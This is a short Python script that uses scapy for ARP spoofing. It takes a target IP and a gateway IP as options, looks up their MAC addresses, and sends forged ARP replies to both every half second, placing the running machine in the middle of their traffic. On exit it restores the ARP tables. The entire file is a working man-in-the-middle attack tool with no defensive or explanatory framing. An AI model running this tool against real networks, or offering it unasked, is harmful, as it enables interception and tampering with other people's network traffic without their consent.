import scapy.all as scapy 
import optparse 
import time

# Taking Options Of Target IP Address And Router IP Address
def get_options():
    parser = optparse.OptionParser()
    parser.add_option('-t','--target', dest="target_ip", help="Specify Target IP Address")
    parser.add_option('-r','--router', dest="target_router", help="Specify Target Gateway IP Address ")
    options , arguments = parser.parse_args()
 
    if not options.target_ip:
        parser.error("[-] Please Specify Target Ip Address")
    if not options.target_router:
        parser.error("[-] Please Specify Target Gateway Ip Address")
    return options

options = get_options()
spoof_ip = options.target_router
target_ip = options.target_ip

# This Fonction Its Sending a ARP Request Then Its Return Only MAC Address Of The Target IP 
def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    arp_broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    request = arp_broadcast/arp_request
    answerd = scapy.srp(request, timeout=1, verbose=False)[0]
    return answerd[0][1].hwsrc

# This Fonction Its Sending a ARP Spoof Request To The Target IP 
def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    spoof_mac = get_mac(spoof_ip)
    arp_response = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(arp_response, verbose=False)

# Restore The ARP Table To Default When Exiting Ehe Programme 
def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    arp_restore = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(arp_restore, verbose=False, count=4)

try:
    while True:
        time.sleep(0.5)
        spoof(target_ip, spoof_ip)
        spoof(spoof_ip, target_ip)
        print("[+] Sending 2 Packets")
except KeyboardInterrupt:
    restore(target_ip, spoof_ip)
    restore(spoof_ip, target_ip)
    print("[-] Ending Spoofing...")
